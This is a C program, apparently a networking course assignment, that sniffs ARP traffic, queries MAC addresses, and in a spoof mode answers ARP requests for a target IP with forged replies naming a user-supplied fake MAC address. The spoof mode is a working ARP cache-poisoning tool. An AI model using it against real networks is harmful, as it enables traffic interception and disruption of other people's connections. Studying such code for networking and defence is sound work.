#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include "arp.h"
#include <unistd.h>
#include <arpa/inet.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>

#define DEVICE_NAME "eth0"

/*
 * You have to open two socket to handle this program.
 * One for input , the other for output.
 */
void if_ip(int *, char*);
void if_mac(unsigned char *,char*,int*);
int main(int argc , char* argv[])
{
	int sockfd_recv = 0, sockfd_send = 0 , sockfd_af;
        int opt,datasize,socklen,io;
        int ifindex=0;
        unsigned char buf[1024],incoming_mac[6],src_mac[6];
        int incoming_ip[4],src_ip[4];
        struct arp_packet ether_pac,request_pac;
        //struct ethhdr *eh = (struct ethhdr*)buf;
	struct sockaddr_ll sa;
	struct ifreq req;
	struct in_addr myip;
        
        int i,j,check=0,spoof_mode_flag=0;
        char ip_buf[50];
       
    
       
        memset(buf,'\0',1024);
        socklen = sizeof(sa);

        //for(i=0;i<6;i++){printf(incoming_mac);
        //check root privilege
	if(getuid() != 0 ){
          printf("ERROR : You must run this program in root privilege\n");
          exit(0);
        }
        


	printf("[ ARP sniffer and spoof program ]\n");
	// Open a recv socket in data-link layer.
	if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL)))<0)
	{
		perror("open recv socket error");
                exit(1);
	}

	/*
	 * Use recvfrom function to get packet.
	 * recvfrom( ... )
	 */


         

	
	// Open a send socket in data-link layer.
	if((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("open send socket error");
		exit(sockfd_send);
	}
	
	/*
	 * Use ioctl function binds the send socket and the Network Interface Card.
`	 * ioctl( ... )
	 */
         // get index
         strncpy(req.ifr_name,DEVICE_NAME,IFNAMSIZ);
         if((io=ioctl(sockfd_send,SIOCGIFINDEX,&req))<0){
		perror("ioctl");
		exit(1);         
         }
         ifindex = req.ifr_ifindex;
         // get ip
         if((io=ioctl(sockfd_send,SIOCGIFADDR,&req))<0){
		perror("ioctl");
		exit(1);         
         }
         myip = ((struct sockaddr_in *)&req.ifr_addr)->sin_addr;
         strcpy(ip_buf,inet_ntoa(myip));
	 //printf("Your IP : %s\n",ip_buf);     
         if_ip(src_ip,ip_buf);
         //get mac
         if((io=ioctl(sockfd_send,SIOCGIFHWADDR,&req))<0){
		perror("ioctl");
		exit(1);         
         }
         //printf("Your MAC : "); 
         for(i=0;i<6;i++){
           src_mac[i]=req.ifr_hwaddr.sa_data[i];
           //printf("%.2x",src_mac[i]);
           //if(i<=4){printf(":");}
         }
         

	 

	
	// Fill the parameters of the sa.
        sa.sll_family = PF_PACKET;
        sa.sll_protocol = ETH_P_ARP;
        sa.sll_ifindex = ifindex;
        sa.sll_hatype = ARPHRD_ETHER;
        sa.sll_pkttype = 0;//PACKET_OTHERHOST
        sa.sll_halen = 0;
        sa.sll_addr[6]=0x00;
        sa.sll_addr[7]=0x00;  


	
	/*
	 * use sendto function with sa variable to send your packet out
	 * sendto( ... )
	 */
        //---------SET REQUEST PACKET-----------------//
        /*ether header*/
        /*eth_des_mac*/
        for(i=0;i<6;i++){request_pac.eth_hdr.ether_dhost[i] = 0xff;}
        //for(i=0;i<6;i++){printf("%.2x:",request_pac.eth_hdr.ether_dhost[i]);};
        //printf("\n");
        /*eth_src_mac*/
        for(i=0;i<6;i++){request_pac.eth_hdr.ether_shost[i] = src_mac[i];}
        //for(i=0;i<6;i++){printf("%.2x:",request_pac.eth_hdr.ether_shost[i]);};
        /*eth_type*/
        request_pac.eth_hdr.ether_type = htons(ETH_P_ARP);
        //printf("%.2x\n",request_pac.eth_hdr.ether_type);

        /*arp header*/
        request_pac.arp.arp_hrd = htons(0x0001);
        request_pac.arp.arp_pro = htons(0x0800);
        request_pac.arp.arp_hln = 0x06;
        request_pac.arp.arp_pln = 0x04;
        request_pac.arp.arp_op = htons(0x0001);
        for(i=0;i<6;i++){request_pac.arp.arp_sha[i] = src_mac[i];}
        for(i=0;i<4;i++){request_pac.arp.arp_spa[i] = src_ip[i];}
        //for(i=0;i<4;i++){request_pac.arp.arp_tpa[i] = src_ip[i];}
        //--------------------------------------------//

        /*if(sendto(sockfd_send,&request_pac,sizeof(request_pac),0,(struct sockaddr *)&sa,(socklen_t)socklen) < 0){
          perror("sendto");
          exit(1);
        }*/
	
	//check argument h,l,q
        if((opt=getopt(argc,argv,"hlq"))!=-1){
          switch(opt){
            case 'h':
              printf("Format:\n");
              printf("(1) ./arp -l -a\n");
              printf("(2) ./arp -l <filter_ip_address>\n");
              printf("(3) ./arp -q <query_ip_address> \n");
              printf("(4) ./arp <fake_Mac_address> <target_ip_address>\n");
              exit(0);
              break;
            case 'l':
                if(argc != 3){
                  printf("Wrong filter ip address\n");
                  exit(0);                    
                }
                printf("### ARP sniffer mode ### \n");
                if(strcmp(argv[2],"-a") == 0){
                  while((datasize = recvfrom(sockfd_recv,(char*)&ether_pac,sizeof(ether_pac),0,NULL,NULL))> 0){
                    if(htons(ether_pac.eth_hdr.ether_type) == 0x806){ 
                      //printf("get arp :%x\n",(unsigned short)htons(ether_pac.eth_hdr.ether_type));
                      if(htons(ether_pac.arp.arp_op) == 0x001){
                        printf("request : who has %d.%d.%d.%d ?   Tell %d.%d.%d.%d\n",ether_pac.arp.arp_tpa[0],ether_pac.arp.arp_tpa[1],
                        ether_pac.arp.arp_tpa[2],ether_pac.arp.arp_tpa[3],ether_pac.arp.arp_spa[0],ether_pac.arp.arp_spa[1],
                        ether_pac.arp.arp_spa[2],ether_pac.arp.arp_spa[3]);
                      }
                    }
                  }
                }
                else{
                  //check argv[2] is an ip address
                  if_ip(incoming_ip,argv[2]);
                  //recv argv[2] ip arp packet
                  while((datasize = recvfrom(sockfd_recv,(char*)&ether_pac,sizeof(ether_pac),0,NULL,NULL))> 0){
                    if(htons(ether_pac.eth_hdr.ether_type) == 0x806){ 
                      //printf("get arp :%x\n",(unsigned short)htons(ether_pac.eth_hdr.ether_type));
                      if(htons(ether_pac.arp.arp_op) == 0x001){
                        if(ether_pac.arp.arp_tpa[0]==incoming_ip[0] && ether_pac.arp.arp_tpa[1] == incoming_ip[1] 
                          && ether_pac.arp.arp_tpa[2]==incoming_ip[2] && ether_pac.arp.arp_tpa[3] == incoming_ip[3]){
                            printf("Get ARP packet - who has %d.%d.%d.%d ?   Tell %d.%d.%d.%d\n",ether_pac.arp.arp_tpa[0],ether_pac.arp.arp_tpa[1],
                            ether_pac.arp.arp_tpa[2],ether_pac.arp.arp_tpa[3],ether_pac.arp.arp_spa[0],ether_pac.arp.arp_spa[1],
                            ether_pac.arp.arp_spa[2],ether_pac.arp.arp_spa[3]);
                        }
                      }
                    }
                  }
                }/*else*/
              break;
            case 'q':
              /*request mode*/
              /*send request arp packet*/
              if(argc != 3){
                  printf("Wrong request ip address\n");
                  exit(0);                  
              }
              printf("### ARP query mode ###\n");
              if_ip(incoming_ip,argv[2]);
              /*for(i=0;i<4;i++){request_pac.arp.arp_spa[i] = src_ip[i];}
              for(i=0;i<6;i++){request_pac.arp.arp_sha[i] = src_mac[i];}*/
              for(i=0;i<4;i++){request_pac.arp.arp_tpa[i] = incoming_ip[i];}
              socklen = sizeof(sa);
              if(sendto(sockfd_send,&request_pac,sizeof(request_pac),0,(struct sockaddr *)&sa,(socklen_t)socklen) < 0){
                perror("sendto");
                exit(1);
              }
              //printf("send the request , waiting for reply \n");
              //recv reply packet
              while((datasize = recvfrom(sockfd_recv,(char*)&ether_pac,sizeof(ether_pac),0,NULL,NULL))> 0 ){
                if(htons(ether_pac.eth_hdr.ether_type) == 0x806){ 
                  if(htons(ether_pac.arp.arp_op) == 0x002){
                      printf("MAC address of %d.%d.%d.%d is %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n",
                      ether_pac.arp.arp_spa[0],ether_pac.arp.arp_spa[1],ether_pac.arp.arp_spa[2],ether_pac.arp.arp_spa[3],
                      ether_pac.arp.arp_sha[0],ether_pac.arp.arp_sha[1],ether_pac.arp.arp_sha[2],ether_pac.arp.arp_sha[3],
                      ether_pac.arp.arp_sha[4],ether_pac.arp.arp_sha[5]);
                      exit(0); 
                  }
                }
              }
              exit(0);             
              break;    
           }
        }
        
        /*-----------spoof mode--------------*/
        if_mac(incoming_mac,argv[1],&spoof_mode_flag);
        if_ip(incoming_ip,argv[2]);
        check ==0;
        if(spoof_mode_flag ==1){printf("### ARP spoof mode ###\n");}
        while(check == 0 && spoof_mode_flag ==1){
              if((datasize = recvfrom(sockfd_recv,(char*)&ether_pac,sizeof(ether_pac),0,NULL,NULL))> 0 ){
                if(htons(ether_pac.eth_hdr.ether_type) == 0x806){ 
                  if(htons(ether_pac.arp.arp_op) == 0x001){
                    if(ether_pac.arp.arp_tpa[0] == incoming_ip[0] && ether_pac.arp.arp_tpa[1] == incoming_ip[1] 
                    && ether_pac.arp.arp_tpa[2] == incoming_ip[2] && ether_pac.arp.arp_tpa[3] == incoming_ip[3]){
                      printf("Get ARP packet : who has %d.%d.%d.%d ?   Tell %d.%d.%d.%d\n",ether_pac.arp.arp_tpa[0],ether_pac.arp.arp_tpa[1],
                      ether_pac.arp.arp_tpa[2],ether_pac.arp.arp_tpa[3],ether_pac.arp.arp_spa[0],ether_pac.arp.arp_spa[1],
                      ether_pac.arp.arp_spa[2],ether_pac.arp.arp_spa[3]);
                      check =1;
                    } 
                  }
                }
              }
              if(check ==1){
                for(i=0;i<6;i++){request_pac.eth_hdr.ether_dhost[i] = ether_pac.arp.arp_sha[i];}
                for(i=0;i<6;i++){request_pac.eth_hdr.ether_shost[i] = src_mac[i];}
                for(i=0;i<4;i++){request_pac.arp.arp_spa[i] = ether_pac.arp.arp_tpa[i];}
                for(i=0;i<6;i++){request_pac.arp.arp_sha[i] = incoming_mac[i];};
                for(i=0;i<4;i++){request_pac.arp.arp_tpa[i] = ether_pac.arp.arp_spa[i];}
                for(i=0;i<6;i++){request_pac.arp.arp_tha[i] = ether_pac.arp.arp_sha[i];};
                request_pac.arp.arp_op = htons(0x0002);
                if(sendto(sockfd_send,&request_pac,sizeof(request_pac),0,(struct sockaddr *)&sa,(socklen_t)socklen) < 0){
                perror("sendto");
                exit(1);
                }
                printf("Send ARP Reply : %d.%d.%d.%d has MAC %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n",ether_pac.arp.arp_tpa[0],ether_pac.arp.arp_tpa[1],
                ether_pac.arp.arp_tpa[2],ether_pac.arp.arp_tpa[3],request_pac.arp.arp_sha[0],request_pac.arp.arp_sha[1],
                request_pac.arp.arp_sha[2],request_pac.arp.arp_sha[3],request_pac.arp.arp_sha[4],request_pac.arp.arp_sha[5]);  
              }
        }
	


	return 0;
}

void if_ip(int *incoming_ip , char* ip){
   char delim[] = ". \n\t";
   char *token=0; 
   int i;
               
   for(i=0;i<=4;i++){
      if(i==0)
        token = strtok(ip,delim);
      else if(i<=3){
        token = strtok(NULL,delim);
        if(token == NULL){
          printf("Wrong filter ip address\n");
          exit(1);
        }
      }
      else{
        token = strtok(NULL,delim);
        if(token != NULL){
          printf("Wrong filter ip address\n");
          exit(1);
        }
                    }
      if(i<=3){
        if(atoi(token)>=0 && atoi(token) <256 ){ 
           incoming_ip[i]=atoi(token);
        }
        else{
          printf("Wrong filter ip address\n");
          exit(0);
        }
     }
  }
}

void if_mac(unsigned char *incoming_mac,char* mac,int* flag){
   char *endptr;
   char delim[] = ": \n\t";
   char *token=0; 
   int i;
   int testmac;

   for(i=0;i<=6;i++){
      if(i==0)
        token = strtok(mac,delim);
      else if(i<=5){
        token = strtok(NULL,delim);
        if(token == NULL){
          printf("Wrong mac address\n");
          exit(1);
        }
      }
      else{
        token = strtok(NULL,delim);
        if(token != NULL){
          printf("Wrong mac address\n");
          exit(1);
        }
      }
      if(i<=5){
        testmac = strtol(token,&endptr,16);
        if(testmac>=0 && testmac <256 ){ 
           incoming_mac[i] = testmac;

        }
        else{
          printf("Wrong mac address\n");
          exit(0);
        }
      }
   }
   
   *flag = 1;  
     
  
}





